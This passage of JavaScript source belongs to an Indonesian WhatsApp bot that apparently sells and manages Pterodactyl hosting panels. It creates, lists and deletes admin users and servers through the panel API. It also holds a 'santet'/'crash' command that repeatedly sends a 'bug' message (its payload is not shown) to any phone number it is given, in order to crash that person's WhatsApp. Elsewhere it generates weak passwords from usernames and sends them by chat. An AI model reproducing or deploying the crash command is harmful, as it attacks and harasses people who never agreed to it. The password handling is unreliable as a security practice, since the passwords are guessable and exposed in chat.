"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
await m.reply(`*Berhasil Membuat Akun Admin Panel ✅*\nData Akun Sudah Dikirim Ke Nomor ${ceknya}`)
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.first_name}
* *Created :* ${user.created_at.split("T")[0]}
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await fadhost.relayMessage(client, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "deladmin": {
if (!isOwner) return fadhostReply(msg.owner)
if (!args[0]) return m.reply(example("id\n\nuntuk melihat id admin ketik *.listadmin*"))
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("ID Admin Tidak Ditemukan!")
m.reply(`Berhasil Menghapus Admin Panel *${capital(getid)}*`)
}
break
case "listadmin": {
if (!isOwner) return fadhostReply(msg.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let totaladmin = 0
if (users.length < 1 ) return m.reply("Tidak Ada Admin Panel")
var teks = " *LIST ADMIN PANEL BOT⚡*\n\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
totaladmin += 1
teks += `\`📡ID User ${i.attributes.id}\`
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n\n`
})
teks += ` Total Admin : *${totaladmin} Admin*`
fadhost.sendText(m.chat, teks, qtoko)
}
break
case "santet": case "crash": {
if (!isOwner) return fadhostReply(msg.owner)
if (!text) return m.reply(example("6283XX,jumlahbug"))
if (!text.split(",")) return m.reply(example("6283XX,jumlahbug"))
var [target, jumlah] = text.split(",")
if (isNaN(target)) return m.reply("Target Tidak Valid!")
if (isNaN(jumlah)) return m.reply("Jumlah Tidak Valid!")
var org = target.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await fadhost.onWhatsApp(org.split('@')[0])
if (!check[0].exists) return m.reply("Target Tidak Terdaftar Di WhatsApp")
m.reply("Memproses Pengiriman Bug . . .")
var total = Number(jumlah) + 10
for (let i = 0; i < total; i++) {
if (i == 10) m.reply(`Berhasil Memproses, Bug Sedang Dikirim Ke ${org.split("@")[0]}`)
MessageBug(`${org}`)
await sleep(2000)
}
}
break
case "cpanel": case "addpanel": case "buatpanel": {
if (!isOwner && !isReseller) return fadhostReply(msg.owner)
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!args[0]) return m.reply(example("nama"))
global.panel = [text.toLowerCase()]
let teksnya = "Silahkan Pilih Ram Server Panel"
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "Pilih Ram Panel", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By ${namaowner}\", "rows": [{ "header": "Ram Unlimited", "title": "Ram Unlimited | CPU Unlimited", "id": ".cpunli" }, 
{ "header": "Ram 1GB", "title": "Ram 1GB | CPU 40%", "id": ".cp1gb" }, 
{ "header": "Ram 2GB", "title": "Ram 2GB | CPU 60%", "id": ".cp2gb" }, 
{ "header": "Ram 3GB", "title": "Ram 3GB | CPU 80%", "id": ".cp3gb" }, 
{ "header": "Ram 4GB", "title": "Ram 4GB | CPU 100%", "id": ".cp4gb" }, 
{ "header": "Ram 5GB", "title": "Ram 5GB | CPU 120%", "id": ".cp5gb" }, 
{ "header": "Ram 6GB", "title": "Ram 6GB | CPU 140%", "id": ".cp6gb" }, 
{ "header": "Ram 7GB", "title": "Ram 7GB | CPU 160%", "id": ".cp7gb" }, 
{ "header": "Ram 8GB", "title": "Ram 8GB | CPU 180%", "id": ".cp8gb" }, 
{ "header": "Ram 9GB", "title": "Ram 9GB | CPU 200%", "id": ".cp9gb" }]}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await fadhost.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "cpanel2": case "addpanel2": case "buatpanel2": {
if (!isOwner && !isReseller) return fadhostReply(msg.owner)
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
global.tempuser = crypto.randomBytes(3).toString('hex')
global.temppw = crypto.randomBytes(4).toString('hex')
let teksnya = "Silahkan Pilih Ram Server Panel, Username & Password Panel Akan Dibuat Secara Otomatis Oleh Bot"
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "Pilih Ram Panel", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By ${namaowner}\", "rows": [{ "header": "Ram Unlimited", "title": "Ram Unlimited | CPU Unlimited", "id": ".cpunliv2" }, 
{ "header": "Ram 1GB", "title": "Ram 1GB | CPU 40%", "id": ".cp1gbv2" }, 
{ "header": "Ram 2GB", "title": "Ram 2GB | CPU 60%", "id": ".cp2gbv2" }, 
{ "header": "Ram 3GB", "title": "Ram 3GB | CPU 80%", "id": ".cp3gbv2" }, 
{ "header": "Ram 4GB", "title": "Ram 4GB | CPU 100%", "id": ".cp4gbv2" }, 
{ "header": "Ram 5GB", "title": "Ram 5GB | CPU 120%", "id": ".cp5gbv2" }, 
{ "header": "Ram 6GB", "title": "Ram 6GB | CPU 140%", "id": ".cp6gbv2" }, 
{ "header": "Ram 7GB", "title": "Ram 7GB | CPU 160%", "id": ".cp7gbv2" }, 
{ "header": "Ram 8GB", "title": "Ram 8GB | CPU 180%", "id": ".cp8gbv2" }, 
{ "header": "Ram 9GB", "title": "Ram 9GB | CPU 200%", "id": ".cp9gbv2" }]}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await fadhost.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "cpanel3": case "addpanel3": case "buatpanel3": {
if (!isOwner && !isReseller) return fadhostReply(msg.owner)
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!args[0]) return m.reply(example("nama,6283XXX"))
if (!text.split(",")) return m.reply(example("nama,6283XXX"))
var buyyer = text.split(",")[0].toLowerCase()
if (!buyyer) return m.reply(example("nama,6283XXX"))
var ceknya = text.split(",")[1]
if (!ceknya) return m.reply(example("nama,6283XXX"))
var client = text.split(",")[1].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await fadhost.onWhatsApp(ceknya)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
global.panel3 = [buyyer, client]
let teksnya = "Silahkan Pilih Ram Server Panel"
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "Pilih Ram Panel", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By ${namaowner}\", "rows": [{ "header": "Ram Unlimited", "title": "Ram Unlimited | CPU Unlimited", "id": ".cpunliv3" }, 
{ "header": "Ram 1GB", "title": "Ram 1GB | CPU 40%", "id": ".cp1gbv3" }, 
{ "header": "Ram 2GB", "title": "Ram 2GB | CPU 60%", "id": ".cp2gbv3" }, 
{ "header": "Ram 3GB", "title": "Ram 3GB | CPU 80%", "id": ".cp3gbv3" }, 
{ "header": "Ram 4GB", "title": "Ram 4GB | CPU 100%", "id": ".cp4gbv3" }, 
{ "header": "Ram 5GB", "title": "Ram 5GB | CPU 120%", "id": ".cp5gbv3" }, 
{ "header": "Ram 6GB", "title": "Ram 6GB | CPU 140%", "id": ".cp6gbv3" }, 
{ "header": "Ram 7GB", "title": "Ram 7GB | CPU 160%", "id": ".cp7gbv3" }, 
{ "header": "Ram 8GB", "title": "Ram 8GB | CPU 180%", "id": ".cp8gbv3" }, 
{ "header": "Ram 9GB", "title": "Ram 9GB | CPU 200%", "id": ".cp9gbv3" }]}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await fadhost.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "cp1gbv2": case "cp2gbv2": case "cp3gbv2": case "cp4gbv2": case "cp5gbv2": case "cp6gbv2": case "cp7gbv2": case "cp8gbv2": case "cp9gbv2": case "cpunliv2": {
if (global.tempuser == null) return m.reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gbv2") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gbv2") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gbv2") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gbv2") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gbv2") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gbv2") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gbv2") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gbv2") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gbv2") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cpunliv2") {
ram = "0"
disknya = "0"
cpu = "0"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isOwner && !isReseller) return fadhostReply(msg.owner)
let username = global.tempuser.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = global.temppw
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (isGroup) {
orang = m.sender
await m.reply("*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${server.id}
* *Nama :* ${name}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
* *CPU :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Storage :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
* *Created :* ${desc}
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${global.temppw.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await fadhost.relayMessage(orang, msgii.message, { 
messageId: msgii.key.id 
})
global.tempuser = null
global.temppw = null
}
break
case "cp1gbv3": case "cp2gbv3": case "cp3gbv3": case "cp4gbv3": case "cp5gbv3": case "cp6gbv3": case "cp7gbv3": case "cp8gbv3": case "cp9gbv3": case "cpunliv3": {
if (global.panel3 == null) return m.reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gbv3") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gbv3") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gbv3") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gbv3") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gbv3") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gbv3") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gbv3") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gbv3") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gbv3") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cpunliv3") {
ram = "0"
disknya = "0"
cpu = "0"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isOwner && !isReseller) return fadhostReply(msg.owner)
let username = global.panel3[0].toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
await m.reply(`*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Nomor ${global.panel3[1].split('@')[0]}`)
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${server.id}
* *Nama :* ${name}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
* *CPU :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Storage :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
* *Created :* ${desc}
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await fadhost.relayMessage(global.panel3[1], msgii.message, { 
messageId: msgii.key.id 
})
global.panel3 = null
}
break
case "cp1gb": case "cp2gb": case "cp3gb": case "cp4gb": case "cp5gb": case "cp6gb": case "cp7gb": case "cp8gb": case "cp9gb": case "cp10gb": case "cp11gb": case "cp12gb": case "cp13gb": case "cp14gb": case "cp15gb": case "cp16gb": case "cp17gb": case "cp18gb": case "cp19gb": case "cp20gb": case "cp21gb": case "cp22gb": case "cp23gb": case "cp24gb": case "cp25gb": case "cp26gb": case "cp27gb": case "cp28gb": case "cp29gb": case "cp30gb": case "cp31gb": case "cp32gb": case "cp33gb": case "cp34gb": case "cp35gb": case "cp36gb": case "cp37gb": case "cp38gb": case "cp39gb": case "cp40gb": case "cp41gb": case "cp42gb": case "cp43gb": case "cp44gb": case "cp45gb": case "cp46gb": case "cp47gb": case "cp48gb": case "cp49gb": case "cp50gb": case "cpunli": {
if (!isOwner && !isReseller) return fadhostReply(msg.owner)
if (global.panel == null) return m.reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gb") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gb") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gb") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gb") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gb") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gb") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gb") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gb") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gb") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cp10gb") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else if (command == "cp11gb") {
ram = "11125"
disknya = "11125"
cpu = "360"
} else if (command == "cp12gb") {
ram = "12125"
disknya = "12125"
cpu = "390"
} else if (command == "cp13gb") {
ram = "13125"
disknya = "13125"
cpu = "420"
} else if (command == "cp14gb") {
ram = "14125"
disknya = "14125"
cpu = "450"
} else if (command == "cp15gb") {
ram = "15125"
disknya = "15125"
cpu = "480"
} else if (command == "cp16gb") {
ram = "16125"
disknya = "16125"
cpu = "510"
} else if (command == "cp17gb") {
ram = "17125"
disknya = "17125"
cpu = "540"
} else if (command == "cp18gb") {
ram = "18125"
disknya = "18125"
cpu = "570"
} else if (command == "cp19gb") {
ram = "19125"
disknya = "19125"
cpu = "600"
} else if (command == "cp20gb") {
ram = "20125"
disknya = "20125"
cpu = "630"
} else if (command == "cp21gb") {
ram = "21125"
disknya = "21125"
cpu = "660"
} else if (command == "cp22gb") {
ram = "22125"
disknya = "22125"
cpu = "660"
} else if (command == "cp23gb") {
ram = "23125"
disknya = "23125"
cpu = "690"
} else if (command == "cp24gb") {
ram = "24125"
disknya = "24125"
cpu = "720"
} else if (command == "cp25gb") {
ram = "25125"
disknya = "25125"
cpu = "750"
} else if (command == "cp26gb") {
ram = "26125"
disknya = "26125"
cpu = "780"
} else if (command == "cp27gb") {
ram = "27125"
disknya = "27125"
cpu = "810"
} else if (command == "cp28gb") {
ram = "28125"
disknya = "28125"
cpu = "840"
} else if (command == "cp29gb") {
ram = "29125"
disknya = "29125"
cpu = "870"
} else if (command == "cp30gb") {
ram = "30125"
disknya = "30125"
cpu = "900"
} else if (command == "cp31gb") {
ram = "31125"
disknya = "31125"
cpu = "930"
} else if (command == "cp32gb") {
ram = "32125"
disknya = "32125"
cpu = "960"
} else if (command == "cp33gb") {
ram = "33125"
disknya = "33125"
cpu = "990"
} else if (command == "cp34gb") {
ram = "34125"
disknya = "34125"
cpu = "1020"
} else if (command == "cp35gb") {
ram = "35125"
disknya = "35125"
cpu = "1050"
} else if (command == "cp36gb") {
ram = "36125"
disknya = "35125"
cpu = "1080"
} else if (command == "cp37gb") {
ram = "37125"
disknya = "37125"
cpu = "1110"
} else if (command == "cp38gb") {
ram = "38125"
disknya = "38125"
cpu = "1240"
} else if (command == "cp39gb") {
ram = "39125"
disknya = "39125"
cpu = "1270"
} else if (command == "cp40gb") {
ram = "40125"
disknya = "40125"
cpu = "1200"
} else if (command == "cp41gb") {
ram = "41125"
disknya = "41125"
cpu = "1230"
} else if (command == "cp42gb") {
ram = "42125"
disknya = "42125"
cpu = "1260"
} else if (command == "cp43gb") {
ram = "43125"
disknya = "43125"
cpu = "1290"
} else if (command == "cp44gb") {
ram = "44125"
disknya = "44125"
cpu = "1320"
} else if (command == "cp45gb") {
ram = "45125"
disknya = "45125"
cpu = "1350"
} else if (command == "cp46gb") {
ram = "46125"
disknya = "46125"
cpu = "1380"
} else if (command == "cp47gb") {
ram = "47125"
disknya = "47125"
cpu = "1410"
} else if (command == "cp48gb") {
ram = "48125"
disknya = "48125"
cpu = "1440"
} else if (command == "cp49gb") {
ram = "49125"
disknya = "49125"
cpu = "1470"
} else if (command == "cp50gb") {
ram = "50125"
disknya = "50125"
cpu = "1500"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isOwner && !isReseller) return fadhostReply(msg.owner)
let username = global.panel[0].toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (isGroup) {
orang = m.sender
await m.reply("*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${server.id}
* *Nama :* ${name}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
* *CPU :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Storage :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
* *Created :* ${desc}
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await fadhost.relayMessage(orang, msgii.message, { 
messageId: msgii.key.id 
})
global.panel = null
}
break
case "listpanel": case "listp": case "listserver": {
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!isOwner) return fadhostReply(msg.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "*LIST SERVER PANEL BOT⚡*\n\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\`📡ID Server ${s.id}\`
* Nama Server : *${s.name}*
